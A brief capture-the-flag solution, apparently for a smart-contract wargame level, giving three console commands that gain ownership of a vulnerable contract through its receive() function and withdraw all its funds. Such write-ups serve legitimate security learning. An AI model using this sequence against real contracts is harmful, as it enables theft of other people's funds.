this puzzle can be directly crack from either console or remix

for console:
//to make your contributions > 0
await contract.contribute({value: 1});

//to trigger the receive() function to set owner to your account
await contract.sendTransaction({value: 1});

//then withdraw all the money
await contract.withdraw();